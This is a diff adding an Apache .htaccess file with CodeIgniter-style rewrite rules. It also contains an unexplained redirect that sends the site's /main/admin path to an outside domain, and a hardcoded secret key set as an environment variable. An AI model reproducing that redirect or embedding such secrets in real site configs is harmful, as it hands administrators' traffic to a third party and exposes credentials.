@@ -1,0 +1,28 @@
+# Helicon Ape version 3.1.0.105
+
+<IfModule mod_rewrite.c>
+
+  RewriteEngine On
+  RewriteBase /
+  
+  RewriteCond %{REQUEST_URI} ^system.*
+  RewriteRule ^(.*)$ /index.php?/$1 [L]
+  
+  RewriteCond %{REQUEST_URI} ^application.*
+  RewriteRule ^(.*)$ /index.php?/$1 [L]
+  
+  RewriteCond %{REQUEST_FILENAME} !-f
+  RewriteCond %{REQUEST_FILENAME} !-d
+  RewriteRule ^(.*)$ index.php?/$1 [L]
+
+  Redirect /main/admin  http://minuti.nh.zonebg.com/err.php
+  
+</IfModule>
+
+<IfModule !mod_rewrite.c>
+  ErrorDocument 404 /index.php
+</IfModule> 
+
+
+SetEnv mod_developer secure-key-308147061
+
